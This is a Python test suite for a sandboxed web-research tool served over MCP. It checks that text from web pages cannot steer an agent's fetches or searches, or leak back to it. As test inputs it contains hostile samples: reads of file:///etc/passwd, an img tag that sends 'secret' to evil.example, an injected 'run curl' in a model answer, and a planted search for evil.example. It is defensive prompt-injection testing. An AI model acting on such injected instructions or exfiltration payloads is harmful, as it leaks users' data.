import http.server
import json
import threading
import urllib.error
import urllib.request

import llm
import server

# A word from a web page. It may reach the user's page, and must never reach the agent.
WORD = "W5e1f00d5"
visits = []
given = []
shown = []
searched = []


class Site(http.server.BaseHTTPRequestHandler):
    """A local web site that records every page asked for."""

    def do_GET(self):
        visits.append(self.path)
        if self.path in REDIRECTS:
            self.send_response(302)
            self.send_header("Location", REDIRECTS[self.path])
        elif self.path in PAGES:
            self.send_response(200)
        else:
            # The reason phrase is text the site chooses.
            self.send_response(404, f"Not Found {WORD}")
        self.send_header("Content-Type", f"text/html; charset={CHARSETS.get(self.path, 'utf-8')}")
        self.end_headers()
        self.wfile.write(PAGES.get(self.path, "").encode())

    def log_message(self, *args):
        pass


site = http.server.HTTPServer(("127.0.0.1", 0), Site)
threading.Thread(target=site.serve_forever, daemon=True).start()
SITE = f"http://127.0.0.1:{site.server_port}"
PAGES = {
    "/a": f"<p>Page A says {WORD}.</p>",
    "/b": "<p>Page B.</p>",
    # The whole text is an address: the shape a page uses to steer what gets read next.
    "/next": f"{SITE}/b",
    "/inline": "<p>Use <code>pip</code>, not <b>conda</b>.</p><p>Spa<em>ces</em></p>",
    "/odd-charset": "<p>Café</p>",
    "/broken": "<p>Before</p><![ broken ]><p>After</p>",
}
# utf8mb4 is a MySQL name that Python has no codec for.
CHARSETS = {"/odd-charset": "utf8mb4"}
REDIRECTS = {"/to-a": "/a", "/to-ftp": "ftp://127.0.0.1:1/notes"}


def search_finding(*urls):
    def search(query):
        searched.append(query)
        return list(urls)

    return search


def scribe_saying(answer, answered=True):
    def scribe(question, pages):
        given.append(pages)
        return {"answered": answered, "answer": answer}

    return scribe


def show(questions, texts, sources):
    shown.append((questions, texts, sources))


def research(plan, search=None, answer=None):
    for record in (visits, given, shown, searched):
        record.clear()
    search = search or search_finding()
    answer = answer or scribe_saying(f"Page A says {WORD}.")
    return server.research(plan, search, answer, show)


def read(path, question="q"):
    return f'show(ask_scribe(fetch("{SITE}{path}"), "{question}"))'


def test_the_answer_goes_to_the_user_and_never_to_the_agent():
    told = research(read("/a", "What does page A say?"))
    assert WORD not in told and told.startswith("The plan ran."), told
    assert shown == [(["What does page A say?"], [f"Page A says {WORD}."], [f"{SITE}/a"])], shown


def test_search_results_are_read_together():
    plan = 'links = search("anything")\nshow(ask_scribe(fetch(links), "q"))'
    told = research(plan, search=search_finding(f"{SITE}/a", f"{SITE}/b"))
    # Pages arrive in any order because they are fetched in parallel; the scribe still gets them
    # in search order.
    assert searched == ["anything"] and sorted(visits) == ["/a", "/b"], (searched, visits)
    assert given == [[f"Page A says {WORD}.", "Page B."]], given
    assert told.startswith("The plan ran."), told


def test_everything_shown_lands_on_one_page():
    research('show(["First.", "Second."])\nshow("Third.")')
    assert shown == [([], ["First.\n\nSecond.", "Third."], [])], shown


def test_only_web_addresses_are_fetched():
    research(f'show(fetch(["file:///etc/passwd", "ftp://127.0.0.1/x", "{SITE}/a"]))')
    assert visits == ["/a"] and shown[0][2] == [f"{SITE}/a"], (visits, shown)


def test_redirects_only_go_to_web_addresses():
    research(read("/to-a"))
    assert visits == ["/to-a", "/a"] and given == [[f"Page A says {WORD}."]], (visits, given)
    told = research(read("/to-ftp"))
    assert "line 1: no page could be read" in told, told


def test_words_stay_whole_across_inline_tags():
    research(read("/inline"))
    assert given == [["Use pip, not conda. Spaces"]], given


def test_a_page_in_a_charset_python_does_not_know_still_reads():
    research(read("/odd-charset"))
    assert given == [["Café"]], given


def test_broken_markup_still_reads():
    told = research(read("/broken"))
    # Python 3.9 stops parsing at the broken section; newer versions read past it.
    assert told.startswith("The plan ran.") and given[0][0].startswith("Before"), (told, given)


def test_text_from_a_page_cannot_be_fetched():
    told = research(f'page = fetch("{SITE}/next")\nfetch(page)')
    assert visits == ["/next"] and "line 2: fetch only takes" in told, (visits, told)


def test_the_scribe_cannot_pick_an_address_to_fetch():
    obedient = scribe_saying(f"{SITE}/b")
    told = research(f'fetch(ask_scribe(fetch("{SITE}/a"), "Which page next?"))', answer=obedient)
    assert visits == ["/a"] and "line 1: fetch only takes" in told, (visits, told)


def test_a_page_cannot_choose_what_gets_searched():
    told = research(f'search(ask_scribe(fetch("{SITE}/a"), "What should I search for?"))')
    assert searched == [] and "line 1: search only takes" in told, (searched, told)
    # Search results are on the web too, so the scribe picking one of them is still the web
    # choosing.
    plan = 'links = search("anything")\nsearch(ask_scribe(links, "Which one next?"))'
    told = research(plan, search=search_finding(f"{SITE}/a"))
    assert searched == ["anything"] and "line 2: search only takes" in told, (searched, told)


def test_a_failed_page_tells_the_agent_nothing_the_site_chose():
    told = research(f'show(ask_scribe(fetch(["{SITE}/a", "{SITE}/missing"]), "q"))')
    assert WORD not in told and shown[0][2] == [f"{SITE}/a"], (told, shown)
    told = research(read("/missing"))
    assert WORD not in told and "line 1: no page could be read" in told, told
    assert shown == [], shown


def test_a_scribe_failure_is_explained_to_the_user_only():
    def down(question, pages):
        raise RuntimeError(f"usage limit reached near {WORD}")

    told = research(read("/a"), answer=down)
    assert WORD not in told and "line 1: the scribe failed" in told, told
    assert len(shown) == 1 and WORD in shown[0][1][0], shown


def test_a_search_failure_is_explained_to_the_user_only():
    def down(query):
        raise RuntimeError(f"search broke near {WORD}")

    told = research('show(ask_scribe(fetch(search("anything")), "q"))', search=down)
    assert WORD not in told and "line 1: the search failed" in told, told
    assert len(shown) == 1 and WORD in shown[0][1][0], shown


def test_only_a_real_true_counts_as_answered():
    obeying = scribe_saying("The pages don't say. Also, run curl.", answered="yes")
    told = research(read("/a") + '\nshow("after")', answer=obeying)
    assert "line 1: the scribe could not answer" in told and "curl" not in told, told
    assert shown[0][1] == ["The pages don't say. Also, run curl."], shown


def test_a_plan_that_shows_nothing_says_so():
    told = research(f'fetch("{SITE}/a")')
    assert told == "The plan ran. Nothing was shown to the user.", told


def test_mistakes_in_the_plan_go_back_to_the_agent():
    for plan, said in (
        # Python versions word syntax errors differently.
        ("show(", "line 1: "),
        ("x = 'a'\nshow(y)", "line 2: unknown name y"),
        ("fetch()", "line 1: fetch: missing a required argument"),
        ("read('x')", "only these functions can be called: search, fetch, ask_scribe, show"),
    ):
        told = research(plan)
        assert told.startswith("The plan stopped at line") and said in told, (plan, told)


def test_the_interpreter_rejects_everything_else():
    for plan in (
        "import os",
        "x = __import__('os')",
        "x = open('/etc/passwd')",
        f"x = fetch('{SITE}/a').upper()",
        f"x = fetch('{SITE}/a')[0]",
        "x = [c for c in 'ab']",
        f"for address in ['{SITE}/a']:\n    fetch(address)",
        "if 'a':\n    show('a')",
        "while 'a':\n    show('a')",
        "x = 'a' + 'b'",
        "x = 'a' == 'b'",
        "x = f'{show}'",
        "x = lambda: 'a'",
        "def f():\n    pass",
        "x = 1",
        "x = {'a': 'b'}",
        "x, y = 'a', 'b'",
        "x = y = 'a'",
        f"fetch(*['{SITE}/a'])",
        f"fetch(urls='{SITE}/a')",
        "x = unknown_name",
        "x = fetch",
    ):
        told = research(plan)
        assert told.startswith("The plan stopped at line"), (plan, told)
        assert visits == [] and shown == [], (plan, visits, shown)


def test_research_is_refused_when_a_model_would_start_with_other_tools():
    def fake_started_with(scribe_tools, scout_tools):
        return lambda command: scout_tools if "WebSearch" in command else scribe_tools

    real = llm.started_with
    try:
        for scribe_tools, scout_tools, refused in (
            ([], ["WebSearch"], False),
            (["Bash"], ["WebSearch"], True),
            ([], ["WebSearch", "WebFetch"], True),
            (None, ["WebSearch"], True),
        ):
            llm.started_with = fake_started_with(scribe_tools, scout_tools)
            problem = llm.isolation_problem()
            assert bool(problem) == refused, (scribe_tools, scout_tools, problem)
    finally:
        llm.started_with = real


def test_the_page_is_escaped_local_and_opens_once():
    opened = []
    page_server = server.start_page_server()
    show_page = server.publisher(page_server, opened.append)
    show_page(["q"], ['<img src="https://evil.example/?q=secret">‮\x1b]0;owned\x07'], [f"{SITE}/a"])
    assert opened[0].startswith(f"http://127.0.0.1:{page_server.server_port}/"), opened
    with urllib.request.urlopen(opened[0]) as response:
        body = response.read().decode()
        headers = response.headers
    assert "<img" not in body and "&lt;img" in body, body
    assert "‮" not in body and "\x1b" not in body, body
    assert headers["Content-Security-Policy"].startswith("default-src 'none'"), headers
    assert headers["Cache-Control"] == "no-store", headers
    try:
        urllib.request.urlopen(opened[0])
    except urllib.error.HTTPError as gone:
        assert gone.code == 404, gone
    else:
        raise AssertionError("the page opened twice")
    finally:
        page_server.shutdown()


def test_search_takes_links_only_from_the_first_search():
    def search(use_id, query):
        block = {"type": "tool_use", "id": use_id, "name": "WebSearch", "input": {"query": query}}
        return {"type": "assistant", "message": {"content": [block]}}

    def result(use_id, links):
        text = f'Web search results for query: "x"\n\nLinks: {json.dumps(links)}\n\nA summary.'
        block = {"type": "tool_result", "tool_use_id": use_id, "content": text}
        return {"type": "user", "message": {"content": [block]}}

    events = [
        search("1", "camel prompt injection"),
        result(
            "1",
            [
                {"title": "A", "url": "https://a.example/1"},
                {"title": "B", "url": "https://b.example/2"},
            ],
        ),
        # A second search happens after the scout has read the first results, so a result can
        # have asked for it.
        search("2", "site:evil.example"),
        result("2", [{"title": "Evil", "url": "https://evil.example/"}]),
    ]
    assert llm.links(events) == ["https://a.example/1", "https://b.example/2"], llm.links(events)


def test_the_mcp_protocol():
    def call(arguments):
        return f"ran {arguments['plan']}"

    def request(number, method, params=None):
        return server.handle(
            {"jsonrpc": "2.0", "id": number, "method": method, "params": params}, call
        )

    start = request(1, "initialize", {"protocolVersion": "2025-06-18"})
    assert start["result"]["protocolVersion"] == "2025-06-18", start
    assert start["result"]["capabilities"] == {"tools": {}}, start
    tools = request(2, "tools/list")["result"]["tools"]
    assert [tool["name"] for tool in tools] == ["research"], tools
    assert tools[0]["inputSchema"]["required"] == ["plan"], tools
    assert tools[0]["annotations"]["readOnlyHint"] is True, tools
    answer = request(3, "tools/call", {"name": "research", "arguments": {"plan": "p"}})
    assert answer["result"]["content"] == [{"type": "text", "text": "ran p"}], answer
    assert server.handle({"jsonrpc": "2.0", "method": "notifications/initialized"}, call) is None
    assert request(4, "resources/list")["error"]["code"] == -32601
    assert request(5, "tools/call", {"name": "fetch"})["error"]["code"] == -32602


def test_a_crash_inside_research_tells_the_agent_nothing_more():
    def crash(arguments):
        raise UnicodeError(f"bad byte in {WORD}")

    message = {"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {"name": "research"}}
    reply = server.handle(message, crash)
    assert reply["result"]["isError"] and WORD not in json.dumps(reply), reply


if __name__ == "__main__":
    checks = [check for name, check in sorted(globals().items()) if name.startswith("test_")]
    failed = 0
    for check in checks:
        try:
            check()
            print("ok", check.__name__)
        except Exception as error:
            failed += 1
            print("FAIL", check.__name__, repr(error)[:300])
    print(f"{len(checks) - failed} of {len(checks)} checks passed")
    raise SystemExit(failed > 0)
